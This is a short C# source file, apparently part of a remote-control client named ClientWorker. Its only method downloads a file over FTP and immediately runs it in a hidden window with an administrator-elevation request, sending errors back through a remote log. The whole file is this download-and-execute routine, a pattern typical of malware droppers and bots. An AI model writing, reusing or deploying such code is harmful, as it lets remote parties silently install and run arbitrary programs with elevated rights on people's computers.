using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;

namespace ClientWorker
{
    public static class FileManager
    {
        public static void GetFileAndRun(string fileName)
        {
            try
            {
                FtpClient.FTPDownloadFile(fileName);

                new Process
                {
                    StartInfo =
                    {
                        FileName = fileName,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Verb = "runas"
                    }
                }.Start();
            }
            catch (Exception ex)
            {
                Log.Send("GetFileAndRun failed: " + ex.ToString());
            }
        }
    }
}
